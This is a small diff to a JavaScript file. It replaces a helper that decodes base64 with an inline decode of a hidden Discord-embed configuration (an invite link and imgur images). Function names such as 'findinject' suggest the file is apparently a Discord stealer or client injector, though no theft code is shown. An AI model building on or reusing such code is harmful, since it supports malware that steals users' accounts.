@@ -248,7 +248,7 @@ switch (process.platform) {
         }
 
         async function getEmbed() {
-          const embed = builder("eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=")
+          const embed = JSON.parse(Buffer.from("eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=", 'base64').toString('utf-8'));
           return {
             avatar: embed.avatar_url,
             url: embed.discord,
@@ -273,10 +273,6 @@ switch (process.platform) {
               }
             }
           });
-        }
-
-        function builder(_) {
-          return JSON.parse(Buffer.from(_, 'base64').toString('utf-8'));
         }
 
         async function findinject(f) {
